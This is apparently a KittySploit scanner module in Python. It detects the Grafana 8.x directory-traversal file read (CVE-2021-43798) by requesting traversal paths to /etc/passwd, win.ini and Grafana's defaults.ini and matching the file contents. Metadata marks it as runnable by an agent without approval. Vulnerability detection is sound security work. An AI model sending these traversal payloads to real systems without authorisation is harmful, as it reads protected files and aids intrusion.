#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Grafana versions 8."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Grafana v8.x - Arbitrary File Read Detection',
        'description': 'Grafana versions 8.0.0-beta1 through 8.3.0 are vulnerable to a local directory traversal, allowing access to local files. The vulnerable URL path is `<grafana_host_url>/public/plugins/NAME/`, where NAME is the plugin ID for any installed plugin.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'packetstorm', 'grafana', 'lfi', 'vkev', 'kev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p',
            'https://nosec.org/home/detail/4914.html',
            'https://github.com/jas502n/Grafana-VulnTips',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-43798',
            'http://packetstormsecurity.com/files/165198/Grafana-Arbitrary-File-Reading.html',
        ],
        'cve': 'CVE-2021-43798',
    }

    def run(self):
        for path in ('/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd', '/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../windows/win.ini', '/public/plugins/alertlist/../../../../../conf/defaults.ini'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            header_any = ('text/plain',)
            body_regexes = ('root:.*:0:([0-9]+):', '\\/tmp\\/grafana\\.sock', '\\[(fonts|extensions|Mail|files)\\]',)
            if (any(m in headers for m in header_any)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
                self.set_info(
                    severity='high',
                    reason="Grafana v8.x - Arbitrary File Read detected",
                    path=path,
                )
                return True
        return False

